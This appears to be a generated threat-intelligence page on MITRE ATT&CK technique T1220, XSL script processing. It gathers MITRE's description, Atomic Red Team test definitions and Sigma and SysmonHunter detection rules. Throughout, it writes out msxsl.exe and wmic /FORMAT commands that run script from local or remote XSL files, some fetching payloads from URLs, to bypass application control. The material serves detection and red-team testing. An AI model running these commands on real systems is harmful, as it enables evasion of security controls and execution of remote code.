
# XSL Script Processing

## Description

### MITRE Description

> Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)

* <code>msxsl.exe customers[.]xml script[.]xsl</code>
* <code>msxsl.exe script[.]xsl script[.]xsl</code>
* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)

* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>

## Aliases

```

```

## Additional Attributes

* Bypass: ['Anti-virus', 'Application control', 'Digital Certificate Validation']
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1220

## Potential Commands

```
C:\Windows\Temp\msxsl.exe PathToAtomicsFolder\T1220\src\msxslxmlfile.xml #{xslfile}
wmic #{wmic_command} /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
wmic process list /FORMAT:"#{remote_xsl_file}"
wmic process list /FORMAT:"#{local_xsl_file}"
C:\Windows\Temp\msxsl.exe #{xmlfile} https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
C:\Windows\Temp\msxsl.exe #{xmlfile} PathToAtomicsFolder\T1220\src\msxslscript.xsl
wmic #{wmic_command} /FORMAT:"PathToAtomicsFolder\T1220\src\wmicscript.xsl"
C:\Windows\Temp\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml #{xslfile}
msxsl.exe
wmic.exeprocess|list|/FORMAT|.xsl
wmic.exeos|get|/FORMAT|.xsl
```

## Commands Dataset

```
[{'command': 'C:\\Windows\\Temp\\msxsl.exe '
             'PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml #{xslfile}\n',
  'name': None,
  'source': 'atomics/T1220/T1220.yaml'},
 {'command': 'C:\\Windows\\Temp\\msxsl.exe #{xmlfile} '
             'PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl\n',
  'name': None,
  'source': 'atomics/T1220/T1220.yaml'},
 {'command': 'C:\\Windows\\Temp\\msxsl.exe '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml '
             '#{xslfile}\n',
  'name': None,
  'source': 'atomics/T1220/T1220.yaml'},
 {'command': 'C:\\Windows\\Temp\\msxsl.exe #{xmlfile} '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl\n',
  'name': None,
  'source': 'atomics/T1220/T1220.yaml'},
 {'command': 'wmic process list /FORMAT:"#{local_xsl_file}"\n',
  'name': None,
  'source': 'atomics/T1220/T1220.yaml'},
 {'command': 'wmic #{wmic_command} '
             '/FORMAT:"PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl"\n',
  'name': None,
  'source': 'atomics/T1220/T1220.yaml'},
 {'command': 'wmic #{wmic_command} '
             '/FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"\n',
  'name': None,
  'source': 'atomics/T1220/T1220.yaml'},
 {'command': 'wmic process list /FORMAT:"#{remote_xsl_file}"\n',
  'name': None,
  'source': 'atomics/T1220/T1220.yaml'},
 {'command': 'msxsl.exe',
  'name': None,
  'source': 'SysmonHunter - XSL Script Processing'},
 {'command': 'wmic.exeprocess|list|/FORMAT|.xsl',
  'name': None,
  'source': 'SysmonHunter - XSL Script Processing'},
 {'command': 'wmic.exeos|get|/FORMAT|.xsl',
  'name': None,
  'source': 'SysmonHunter - XSL Script Processing'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Timur Zinniatullin, oscd.community',
                  'date': '2019/10/21',
                  'description': 'Extensible Stylesheet Language (XSL) files '
                                 'are commonly used to describe the processing '
                                 'and rendering of data within XML files, rule '
                                 'detects when adversaries abuse this '
                                 'functionality to execute arbitrary files '
                                 'while potentially bypassing application '
                                 'whitelisting defenses',
                  'detection': {'condition': 'selection',
                                'selection': [{'CommandLine|contains': '/format',
                                               'Image|endswith': '\\wmic.exe'},
                                              {'Image|endswith': '\\msxsl.exe'}]},
                  'falsepositives': ['WMIC.exe FP depend on scripts and '
                                     'administrative methods used in the '
                                     'monitored environment',
                                     'msxsl.exe is not installed by default so '
                                     'unlikely.'],
                  'id': '05c36dd6-79d6-4a9a-97da-3db20298ab2d',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/11/04',
                  'references': ['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.yaml'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1220'],
                  'title': 'XSL Script Processing'}}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - XSL Script Processing': {'atomic_tests': [{'auto_generated_guid': 'ca23bfb2-023f-49c5-8802-e66997de462d',
                                                                     'dependencies': [{'description': 'XML '
                                                                                                      'file '
                                                                                                      'must '
                                                                                                      'exist '
                                                                                                      'on '
                                                                                                      'disk '
                                                                                                      'at '
                                                                                                      'specified '
                                                                                                      'location '
                                                                                                      '(#{xmlfile})\n',
                                                                                       'get_prereq_command': 'New-Item '
                                                                                                             '-Type '
                                                                                                             'Directory '
                                                                                                             '(split-path '
                                                                                                             '#{xmlfile}) '
                                                                                                             '-ErrorAction '
                                                                                                             'ignore '
                                                                                                             '| '
                                                                                                             'Out-Null\n'
                                                                                                             'Invoke-WebRequest '
                                                                                                             '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" '
                                                                                                             '-OutFile '
                                                                                                             '"#{xmlfile}"\n',
                                                                                       'prereq_command': 'if '
                                                                                                         '(Test-Path '
                                                                                                         '#{xmlfile}) '
                                                                                                         '{exit '
                                                                                                         '0} '
                                                                                                         'else '
                                                                                                         '{exit '
                                                                                                         '1}\n'},
                                                                                      {'description': 'XSL '
                                                                                                      'file '
                                                                                                      'must '
                                                                                                      'exist '
                                                                                                      'on '
                                                                                                      'disk '
                                                                                                      'at '
                                                                                                      'specified '
                                                                                                      'location '
                                                                                                      '(#{xslfile})\n',
                                                                                       'get_prereq_command': 'New-Item '
                                                                                                             '-Type '
                                                                                                             'Directory '
                                                                                                             '(split-path '
                                                                                                             '#{xslfile}) '
                                                                                                             '-ErrorAction '
                                                                                                             'ignore '
                                                                                                             '| '
                                                                                                             'Out-Null\n'
                                                                                                             'Invoke-WebRequest '
                                                                                                             '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" '
                                                                                                             '-OutFile '
                                                                                                             '"#{xslfile}"\n',
                                                                                       'prereq_command': 'if '
                                                                                                         '(Test-Path '
                                                                                                         '#{xslfile}) '
                                                                                                         '{exit '
                                                                                                         '0} '
                                                                                                         'else '
                                                                                                         '{exit '
                                                                                                         '1}\n'}],
                                                                     'dependency_executor_name': 'powershell',
                                                                     'description': 'Executes '
                                                                                    'the '
                                                                                    'code '
                                                                                    'specified '
                                                                                    'within '
                                                                                    'a '
                                                                                    'XSL '
                                                                                    'script '
                                                                                    'tag '
                                                                                    'during '
                                                                                    'XSL '
                                                                                    'transformation '
                                                                                    'using '
                                                                                    'a '
                                                                                    'local '
                                                                                    'payload. '
                                                                                    'Requires '
                                                                                    'download '
                                                                                    'of '
                                                                                    'MSXSL '
                                                                                    'from '
                                                                                    'Microsoft '
                                                                                    'at '
                                                                                    'https://www.microsoft.com/en-us/download/details.aspx?id=21714. '
                                                                                    'Open '
                                                                                    'Calculator.exe '
                                                                                    'when '
                                                                                    'test '
                                                                                    'sucessfully '
                                                                                    'executed, '
                                                                                    'while '
                                                                                    'AV '
                                                                                    'turned '
                                                                                    'off.\n',
                                                                     'executor': {'command': 'C:\\Windows\\Temp\\msxsl.exe '
                                                                                             '#{xmlfile} '
                                                                                             '#{xslfile}\n',
                                                                                  'name': 'command_prompt'},
                                                                     'input_arguments': {'xmlfile': {'default': 'PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml',
                                                                                                     'description': 'Location '
                                                                                                                    'of '
                                                                                                                    'the '
                                                                                                                    'test '
                                                                                                                    'XML '
                                                                                                                    'file '
                                                                                                                    'on '
                                                                                                                    'the '
                                                                                                                    'local '
                                                                                                                    'filesystem.',
                                                                                                     'type': 'Path'},
                                                                                         'xslfile': {'default': 'PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl',
                                                                                                     'description': 'Location '
                                                                                                                    'of '
                                                                                                                    'the '
                                                                                                                    'test '
                                                                                                                    'XSL '
                                                                                                                    'script '
                                                                                                                    'file '
                                                                                                                    'on '
                                                                                                                    'the '
                                                                                                                    'local '
                                                                                                                    'filesystem.',
                                                                                                     'type': 'Path'}},
                                                                     'name': 'MSXSL '
                                                                             'Bypass '
                                                                             'using '
                                                                             'local '
                                                                             'files',
                                                                     'supported_platforms': ['windows']},
                                                                    {'auto_generated_guid': 'a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985',
                                                                     'description': 'Executes '
                                                                                    'the '
                                                                                    'code '
                                                                                    'specified '
                                                                                    'within '
                                                                                    'a '
                                                                                    'XSL '
                                                                                    'script '
                                                                                    'tag '
                                                                                    'during '
                                                                                    'XSL '
                                                                                    'transformation '
                                                                                    'using '
                                                                                    'a '
                                                                                    'remote '
                                                                                    'payload. '
                                                                                    'Requires '
                                                                                    'download '
                                                                                    'of '
                                                                                    'MSXSL '
                                                                                    'from '
                                                                                    'Microsoft '
                                                                                    'at '
                                                                                    'https://www.microsoft.com/en-us/download/details.aspx?id=21714. '
                                                                                    'Open '
                                                                                    'Calculator.exe '
                                                                                    'when '
                                                                                    'test '
                                                                                    'sucessfully '
                                                                                    'executed, '
                                                                                    'while '
                                                                                    'AV '
                                                                                    'turned '
                                                                                    'off.\n',
                                                                     'executor': {'command': 'C:\\Windows\\Temp\\msxsl.exe '
                                                                                             '#{xmlfile} '
                                                                                             '#{xslfile}\n',
                                                                                  'name': 'command_prompt'},
                                                                     'input_arguments': {'xmlfile': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml',
                                                                                                     'description': 'Remote '
                                                                                                                    'location '
                                                                                                                    '(URL) '
                                                                                                                    'of '
                                                                                                                    'the '
                                                                                                                    'test '
                                                                                                                    'XML '
                                                                                                                    'file.',
                                                                                                     'type': 'Url'},
                                                                                         'xslfile': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl',
                                                                                                     'description': 'Remote '
                                                                                                                    'location '
                                                                                                                    '(URL) '
                                                                                                                    'of '
                                                                                                                    'the '
                                                                                                                    'test '
                                                                                                                    'XSL '
                                                                                                                    'script '
                                                                                                                    'file.',
                                                                                                     'type': 'Url'}},
                                                                     'name': 'MSXSL '
                                                                             'Bypass '
                                                                             'using '
                                                                             'remote '
                                                                             'files',
                                                                     'supported_platforms': ['windows']},
                                                                    {'auto_generated_guid': '1b237334-3e21-4a0c-8178-b8c996124988',
                                                                     'dependencies': [{'description': 'XSL '
                                                                                                      'file '
                                                                                                      'must '
                                                                                                      'exist '
                                                                                                      'on '
                                                                                                      'disk '
                                                                                                      'at '
                                                                                                      'specified '
                                                                                                      'location '
                                                                                                      '(#{local_xsl_file})\n',
                                                                                       'get_prereq_command': 'New-Item '
                                                                                                             '-Type '
                                                                                                             'Directory '
                                                                                                             '(split-path '
                                                                                                             '#{local_xsl_file}) '
                                                                                                             '-ErrorAction '
                                                                                                             'ignore '
                                                                                                             '| '
                                                                                                             'Out-Null\n'
                                                                                                             'Invoke-WebRequest '
                                                                                                             '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" '
                                                                                                             '-OutFile '
                                                                                                             '"#{local_xsl_file}"\n',
                                                                                       'prereq_command': 'if '
                                                                                                         '(Test-Path '
                                                                                                         '#{local_xsl_file}) '
                                                                                                         '{exit '
                                                                                                         '0} '
                                                                                                         'else '
                                                                                                         '{exit '
                                                                                                         '1}\n'}],
                                                                     'dependency_executor_name': 'powershell',
                                                                     'description': 'Executes '
                                                                                    'the '
                                                                                    'code '
                                                                                    'specified '
                                                                                    'within '
                                                                                    'a '
                                                                                    'XSL '
                                                                                    'script '
                                                                                    'using '
                                                                                    'a '
                                                                                    'local '
                                                                                    'payload.\n',
                                                                     'executor': {'command': 'wmic '
                                                                                             '#{wmic_command} '
                                                                                             '/FORMAT:"#{local_xsl_file}"\n',
                                                                                  'name': 'command_prompt'},
                                                                     'input_arguments': {'local_xsl_file': {'default': 'PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl',
                                                                                                            'description': 'Location '
                                                                                                                           'of '
                                                                                                                           'the '
                                                                                                                           'test '
                                                                                                                           'XSL '
                                                                                                                           'script '
                                                                                                                           'file '
                                                                                                                           'on '
                                                                                                                           'the '
                                                                                                                           'local '
                                                                                                                           'filesystem.',
                                                                                                            'type': 'path'},
                                                                                         'wmic_command': {'default': 'process '
                                                                                                                     'list',
                                                                                                          'description': 'WMI '
                                                                                                                         'command '
                                                                                                                         'to '
                                                                                                                         'execute '
                                                                                                                         'using '
                                                                                                                         'wmic.exe',
                                                                                                          'type': 'string'}},
                                                                     'name': 'WMIC '
                                                                             'bypass '
                                                                             'using '
                                                                             'local '
                                                                             'XSL '
                                                                             'file',
                                                                     'supported_platforms': ['windows']},
                                                                    {'auto_generated_guid': '7f5be499-33be-4129-a560-66021f379b9b',
                                                                     'description': 'Executes '
                                                                                    'the '
                                                                                    'code '
                                                                                    'specified '
                                                                                    'within '
                                                                                    'a '
                                                                                    'XSL '
                                                                                    'script '
                                                                                    'using '
                                                                                    'a '
                                                                                    'remote '
                                                                                    'payload. '
                                                                                    'Open '
                                                                                    'Calculator.exe '
                                                                                    'when '
                                                                                    'test '
                                                                                    'sucessfully '
                                                                                    'executed, '
                                                                                    'while '
                                                                                    'AV '
                                                                                    'turned '
                                                                                    'off.\n',
                                                                     'executor': {'command': 'wmic '
                                                                                             '#{wmic_command} '
                                                                                             '/FORMAT:"#{remote_xsl_file}"\n',
                                                                                  'name': 'command_prompt'},
                                                                     'input_arguments': {'remote_xsl_file': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl',
                                                                                                             'description': 'Remote '
                                                                                                                            'location '
                                                                                                                            'of '
                                                                                                                            'an '
                                                                                                                            'XSL '
                                                                                                                            'payload.',
                                                                                                             'type': 'url'},
                                                                                         'wmic_command': {'default': 'process '
                                                                                                                     'list',
                                                                                                          'description': 'WMI '
                                                                                                                         'command '
                                                                                                                         'to '
                                                                                                                         'execute '
                                                                                                                         'using '
                                                                                                                         'wmic.exe',
                                                                                                          'type': 'string'}},
                                                                     'name': 'WMIC '
                                                                             'bypass '
                                                                             'using '
                                                                             'remote '
                                                                             'XSL '
                                                                             'file',
                                                                     'supported_platforms': ['windows']}],
                                                   'attack_technique': 'T1220',
                                                   'display_name': 'XSL Script '
                                                                   'Processing'}},
 {'SysmonHunter - T1220': {'description': None,
                           'level': 'medium',
                           'name': 'XSL Script Processing',
                           'phase': 'Execution',
                           'query': [{'process': {'any': {'pattern': 'msxsl.exe'}},
                                      'type': 'process'},
                                     {'process': {'cmdline': {'op': 'and',
                                                              'pattern': 'process|list|/FORMAT|.xsl'},
                                                  'image': {'pattern': 'wmic.exe'}},
                                      'type': 'process'},
                                     {'process': {'cmdline': {'op': 'and',
                                                              'pattern': 'os|get|/FORMAT|.xsl'},
                                                  'image': {'pattern': 'wmic.exe'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations


* [XSL Script Processing Mitigation](../mitigations/XSL-Script-Processing-Mitigation.md)

* [Execution Prevention](../mitigations/Execution-Prevention.md)
    

# Actors


* [Cobalt Group](../actors/Cobalt-Group.md)

